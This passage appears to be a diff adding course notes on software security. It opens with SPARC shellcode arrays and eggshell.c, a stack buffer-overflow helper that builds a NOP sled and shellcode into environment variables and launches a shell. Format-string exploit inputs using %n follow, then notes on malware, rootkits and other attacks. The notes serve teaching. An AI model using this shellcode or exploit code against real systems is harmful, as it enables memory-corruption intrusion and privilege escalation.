+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08</span><span style="color:#ed9d13">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">get_sp</span>(<span style="color:#6ab825;font-weight:bold">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">__asm__</span>(<span style="color:#ed9d13">&#34;or %sp, %sp, %i0&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#elif defined(__sparc__) &amp;&amp; defined(__sun__)
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define NOP_SIZE        4
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span><span style="color:#6ab825;font-weight:bold">char</span> nop[]=<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xac\x15\xa1\x6e</span><span style="color:#ed9d13">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">char</span> shellcode[] =
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff</span><span style="color:#ed9d13">&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01</span><span style="color:#ed9d13">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">long</span> <span style="color:#447fcf">get_sp</span>(<span style="color:#6ab825;font-weight:bold">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">__asm__</span>(<span style="color:#ed9d13">&#34;or %sp, %sp, %i0&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#endif
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#999;font-style:italic">// eggshell.c
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&#34;shellcode.h&#34;</span><span style="color:#cd2828;font-weight:bold">
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define DEFAULT_OFFSET                    0
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define DEFAULT_BUFFER_SIZE             512
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold">#define DEFAULT_EGG_SIZE               2048
+</span></span></span><span style="display:flex;"><span><span style="color:#cd2828;font-weight:bold"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">usage</span>(<span style="color:#6ab825;font-weight:bold">void</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>(<span style="color:#6ab825;font-weight:bold">int</span> argc, <span style="color:#6ab825;font-weight:bold">char</span> *argv[]) {
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">char</span> *ptr, *bof, *egg;
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">long</span> *addr_ptr, addr;
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">int</span> i, n, m, c, align=<span style="color:#3677a9">0</span>, eggsize=DEFAULT_EGG_SIZE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">while</span> ((c = <span style="color:#447fcf">getopt</span>(argc, argv, <span style="color:#ed9d13">&#34;a:b:e:o:&#34;</span>)) != EOF)
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">switch</span> (c) {
+</span></span><span style="display:flex;"><span>      <span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#39;a&#39;</span>:
+</span></span><span style="display:flex;"><span>        align = <span style="color:#447fcf">atoi</span>(optarg);
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#39;b&#39;</span>:
+</span></span><span style="display:flex;"><span>        bsize = <span style="color:#447fcf">atoi</span>(optarg);
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#39;e&#39;</span>:
+</span></span><span style="display:flex;"><span>        eggsize = <span style="color:#447fcf">atoi</span>(optarg);
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#39;o&#39;</span>:
+</span></span><span style="display:flex;"><span>        offset = <span style="color:#447fcf">atoi</span>(optarg);
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#6ab825;font-weight:bold">case</span> <span style="color:#ed9d13">&#39;?&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#447fcf">usage</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#447fcf">exit</span>(<span style="color:#3677a9">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#447fcf">strlen</span>(shellcode) &gt; eggsize) {
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;Shellcode is larger the the egg.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">exit</span>(<span style="color:#3677a9">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">if</span> (!(bof = <span style="color:#447fcf">malloc</span>(bsize))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;Can&#39;t allocate memory.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">exit</span>(<span style="color:#3677a9">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">if</span> (!(egg = <span style="color:#447fcf">malloc</span>(eggsize))) {
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;Can&#39;t allocate memory.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#447fcf">exit</span>(<span style="color:#3677a9">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  addr = <span style="color:#447fcf">get_sp</span>() - offset;
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[ Buffer size:</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13">\t\t</span><span style="color:#ed9d13">Egg size:</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">Aligment:</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">]</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>,
+</span></span><span style="display:flex;"><span>    bsize, eggsize, align);
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">printf</span>(<span style="color:#ed9d13">&#34;[ Address:</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">0x%x</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">Offset:</span><span style="color:#ed9d13">\t\t</span><span style="color:#ed9d13">%d</span><span style="color:#ed9d13">\t\t\t\t</span><span style="color:#ed9d13">]</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>, addr, offset);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  addr_ptr = (<span style="color:#6ab825;font-weight:bold">long</span> *) bof;
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">for</span> (i = <span style="color:#3677a9">0</span>; i &lt; bsize; i+=<span style="color:#3677a9">4</span>)
+</span></span><span style="display:flex;"><span>    *(addr_ptr++) = addr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ptr = egg;
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">for</span> (i = <span style="color:#3677a9">0</span>; i &lt;= eggsize - <span style="color:#447fcf">strlen</span>(shellcode) - NOP_SIZE; i += NOP_SIZE)
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">for</span> (n = <span style="color:#3677a9">0</span>; n &lt; NOP_SIZE; n++) {
+</span></span><span style="display:flex;"><span>      m = (n + align) % NOP_SIZE;
+</span></span><span style="display:flex;"><span>      *(ptr++) = nop[m];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6ab825;font-weight:bold">for</span> (i = <span style="color:#3677a9">0</span>; i &lt; <span style="color:#447fcf">strlen</span>(shellcode); i++)
+</span></span><span style="display:flex;"><span>    *(ptr++) = shellcode[i];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  bof[bsize - <span style="color:#3677a9">1</span>] = <span style="color:#ed9d13">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>  egg[eggsize - <span style="color:#3677a9">1</span>] = <span style="color:#ed9d13">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">memcpy</span>(egg,<span style="color:#ed9d13">&#34;EGG=&#34;</span>,<span style="color:#3677a9">4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">putenv</span>(egg);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">memcpy</span>(bof,<span style="color:#ed9d13">&#34;BOF=&#34;</span>,<span style="color:#3677a9">4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">putenv</span>(bof);
+</span></span><span style="display:flex;"><span>  <span style="color:#447fcf">system</span>(<span style="color:#ed9d13">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">usage</span>(<span style="color:#6ab825;font-weight:bold">void</span>) {
+</span></span><span style="display:flex;"><span>  (<span style="color:#6ab825;font-weight:bold">void</span>)<span style="color:#447fcf">fprintf</span>(stderr,
+</span></span><span style="display:flex;"><span>    <span style="color:#ed9d13">&#34;usage: eggshell [-a &lt;alignment&gt;] [-b &lt;buffersize&gt;] [-e &lt;eggsize&gt;] [-o &lt;offset&gt;]</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In the end</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>SHELL CODE
+</span></span><span style="display:flex;"><span>NOP
+</span></span><span style="display:flex;"><span>FILLED RAS
+</span></span></code></pre></div></details>
+<h3 id="single-bytes-buffer-overflow" >Single Bytes Buffer Overflow
+<span>
+    <a href="#single-bytes-buffer-overflow">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Programmers forget to allocate null terminator so a single byte can be written past the end of the buffer</li>
+<li>Heap Overflow</li>
+</ul>
+<h3 id="causes" >Causes
+<span>
+    <a href="#causes">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Missing boundary check</li>
+<li>Ability to overwrite important memory regions</li>
+<li>Data is treated as code and executed</li>
+<li>Predictability of the addresses</li>
+</ul>
+<h3 id="defences" >Defences
+<span>
+    <a href="#defences">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Use a language with bounds checking</li>
+<li>Canaries (padding between data and return address)</li>
+<li>Check if stack has been overwritten before the return from each function</li>
+<li>OS</li>
+<li>Hardware</li>
+</ul>
+<h3 id="cross-site-scripting-xss-attacks" >Cross-Site Scripting (XSS) Attacks
+<span>
+    <a href="#cross-site-scripting-xss-attacks">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Use browser interprets the data as code</li>
+<li>Client-side mediation
+<ul>
+<li>Invalid data</li>
+<li>Client is arbitrary, so need to enforce validation on server</li>
+</ul>
+</li>
+</ul>
+<h3 id="format-string-vulnerabilities" >Format String Vulnerabilities
+<span>
+    <a href="#format-string-vulnerabilities">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>printf(buffer) instead of printf(&quot;%s&quot;, buffer)</li>
+<li>provide input:<code>%d...%s</code></li>
+<li>Suppose we want to read a variable <code>pin</code> and the address through debugging is said to be <code>0x0804fa88</code></li>
+<li>Provide input <code>0x0804fa888%d...%s</code></li>
+<li>Provide input <code>0x0804fa888%d...%n</code> ← %n can change the value</li>
+</ul>
+<h3 id="tocttou" >TOCTTOU
+<span>
+    <a href="#tocttou">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>time-of-check to time-of-use</li>
+<li>gap between time of check and the time of use</li>
+<li>unix terminal was running with SU to allocate terminals to users (which was a privilege operation)</li>
+<li>Supported command to write to log file</li>
+<li>First checks if the user has the permissions to write to the requested file, and opens the file for writing</li>
+<li>The attacker would first make a symbolic link to a file they she owned, and then changes it to another file</li>
+<li>The attacker would most likely run the exploit in a loop</li>
+<li>Defences:
+<ul>
+<li>Atomic operation</li>
+<li>Use file handles not file names since file handles cannot be changed</li>
+</ul>
+</li>
+</ul>
+<h3 id="malicious-code-malware" >Malicious code: Malware
+<span>
+    <a href="#malicious-code-malware">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Malicious software
+<ul>
+<li>User action
+<ul>
+<li>Channels
+<ul>
+<li>USBs are automatically executed</li>
+<li>Downloading and running</li>
+<li>Executable email attachment</li>
+<li>Inserting CD/DVD or USB flash drive</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Exploiting an existing fault in a system
+<ul>
+<li>Whatsapp buffer overflows is SMS daemon</li>
+</ul>
+</li>
+<li>Virus
+<ul>
+<li>Adds itself to benign programs/files</li>
+<li>Code for spreading + code for actual attack</li>
+<li>Usually activated by users</li>
+</ul>
+</li>
+<li>Worms
+<ul>
+<li>Spreading with no or little user involvement</li>
+</ul>
+</li>
+<li>Trojans
+<ul>
+<li>HIdden in seemingly innocent program</li>
+</ul>
+</li>
+<li>Logic bombs
+<ul>
+<li>Hidden in programs already on your machine</li>
+</ul>
+</li>
+<li>Infection</li>
+</ul>
+</li>
+<li>Infection
+<ul>
+<li>Infect the computer itself</li>
+<li>Modifying the boot loader</li>
+<li>Executable: modifying other programs and add to the beginning</li>
+<li>Macros: edit other documents to add itself as a macro which starts automatically</li>
+</ul>
+</li>
+<li>Payload
+<ul>
+<li>The bad thing
+<ul>
+<li>Erase hard drive</li>
+<li>Corrupt some of your spreadsheets</li>
+<li>Keylogger</li>
+<li>Attacks a website</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Signature-based protection
+<ul>
+<li>Keep a list of all known viruses</li>
+<li>Infection code and payload code</li>
+<li>viruses try obfuscation</li>
+</ul>
+</li>
+<li>Polymorphism
+<ul>
+<li>When code is shared, the virus is encrypted, and then decrypted</li>
+<li>Encrypt with different keys for different machines</li>
+</ul>
+</li>
+<li>Behaviour-based protection
+<ul>
+<li>Run in a sandbox first</li>
+<li>Look for suspicious patterns not specific code fragments</li>
+</ul>
+</li>
+<li>False negative vs. False positive
+<ul>
+<li>False negative is worse</li>
+</ul>
+</li>
+<li>Code Red Worm
+<ul>
+<li>2001, IIS exploit, patch available for more than one month</li>
+</ul>
+</li>
+<li>Stuxnet
+<ul>
+<li>Discovered in 2010, targets Siemens SCADA systems installed on Windows. Gas centrifuges.</li>
+<li>Four zero-day vulnerabilities</li>
+<li>Very targeted</li>
+</ul>
+</li>
+<li>IoT Malware
+<ul>
+<li>Limited in terms of resources</li>
+</ul>
+</li>
+<li>Trojan Horses
+<ul>
+<li>Programs which claim to do something innocuous but hide malicious behaviour</li>
+</ul>
+</li>
+<li>Scareware</li>
+<li>Ransomware</li>
+<li>Web bug
+<ul>
+<li>Intuit violation of privacy</li>
+</ul>
+</li>
+<li>Back doors
+<ul>
+<li>Debugging left overs</li>
+</ul>
+</li>
+</ul>
+<h3 id="privilege-escalation" >Privilege Escalation
+<span>
+    <a href="#privilege-escalation">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>A legitimate part that runs with higher privieldge</li>
+<li>Attacker wants to trick the system into running custom command</li>
+<li>StrandHogg 2.0: Critical Android flow allows app hijacking, data theft</li>
+</ul>
+<h3 id="rootkits" >Rootkits
+<span>
+    <a href="#rootkits">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>often used by script kiddies</li>
+<li>Two main parts
+<ul>
+<li>gaining unauthorized root / admin priviledges
+<ul>
+<li>known exploit</li>
+<li>backdoor added</li>
+</ul>
+</li>
+<li>hides existence
+<ul>
+<li>clean up log messages created by exploit</li>
+<li>modify commands like ls and ps to not report files and processes by the rootkit</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>Example: Sony XCP</p>
+<ul>
+<li>Mark Russinovinch developed rootkit scanner for Windows</li>
+<li>Sony audio CD player (XCP) &ldquo;copy protection&rdquo;</li>
+<li>audio CD has an autorun.exe which auto executes and installs a rootkit</li>
+<li>Sony released an uninstaller that left a back door</li>
+<li>Hard to find and uninstall because files and processes started with $sys$ were hidden</li>
+<li>It&rsquo;s basically HIV but for computers</li>
+</ul>
+<h3 id="keystroke-logger" >Keystroke Logger
+<span>
+    <a href="#keystroke-logger">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>record of email / IM you send, all passwords you type</li>
+<li>data can abe access locally or sent to a remote server</li>
+<li>installed by malware</li>
+<li>application specific</li>
+<li>system specific</li>
+<li>hardware keyboard logger</li>
+</ul>
+<h3 id="interface-illusions" >Interface Illusions
+<span>
+    <a href="#interface-illusions">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>What if dragging on that “scrollbar” really dragged a program (from a malicious website) into your “Startup” folder (in addition to scrolling the document)? This really happened</p>
+<ul>
+<li>Conficker worm had &ldquo;open folder and view files&rdquo; under Install or run program.</li>
+</ul>
+<h3 id="clickjacking" >Clickjacking
+<span>
+    <a href="#clickjacking">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>trick user into clicking something disguised as innocuous</li>
+</ul>
+<h3 id="phishing" >Phishing
+<span>
+    <a href="#phishing">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Example of interface illusion</li>
+<li>Can make the website look like the real thing
+<ul>
+<li>Everything except for the URL (but it&rsquo;s possible to have very hidden characters)</li>
+</ul>
+</li>
+</ul>
+<h3 id="man-in-the-middle" >Man-in-The-Middle
+<span>
+    <a href="#man-in-the-middle">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>man in the middle intercepts communication from user and sends it to the intended party</li>
+<li>sees, records, and can capture passwords, and insert malicious commands</li>
+</ul>
+<h3 id="nonmalicious-flaws-covert-channels" >Nonmalicious flaws: Covert Channels
+<span>
+    <a href="#nonmalicious-flaws-covert-channels">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><ul>
+<li>Attacker creates a capability to transfer sensitive Information through a channel that is not supposed to transmit information</li>
+<li>What information can/cannot be transmitted through a channel may be determined by a policy/guidelines/physical limitation</li>
+<li>An attacker sees that the victim, although not using internet, publishes a report summarizing public information</li>
+<li>The attacker can hide the data in the report</li>
+</ul>
